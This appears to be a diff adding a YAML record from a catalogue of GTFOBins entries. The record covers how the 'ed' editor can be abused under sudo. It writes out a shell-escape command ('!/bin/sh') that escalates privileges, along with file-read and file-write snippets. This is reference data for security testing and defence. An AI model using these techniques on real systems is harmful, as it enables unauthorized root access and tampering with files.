@@ -1,0 +1,119 @@
+id: gtfobins/ed/shell/sudo
+type: binary
+platform: linux
+name: ed
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+aliases:
+- red
+commands:
+- template: 'ed
+
+    !/bin/sh
+
+    q'
+references:
+- https://gtfobins.github.io/gtfobins/ed/
+- https://gtfobins.github.io/gtfobins/red/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        ed:
+          functions:
+            file-read:
+            - binary: false
+              code: 'ed /path/to/input-file
+
+                ,p
+
+                q'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - binary: false
+              code: 'ed /path/to/output-file
+
+                a
+
+                DATA
+
+                .
+
+                w
+
+                q'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: 'ed
+
+                !/bin/sh
+
+                q'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+        red:
+          alias: ed
+    upstream_url: https://gtfobins.github.io/gtfobins/ed/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:bdc87665174244541dcb3d8844a07c1aa0ab76e29bd8f9e28dca10be0e700f24
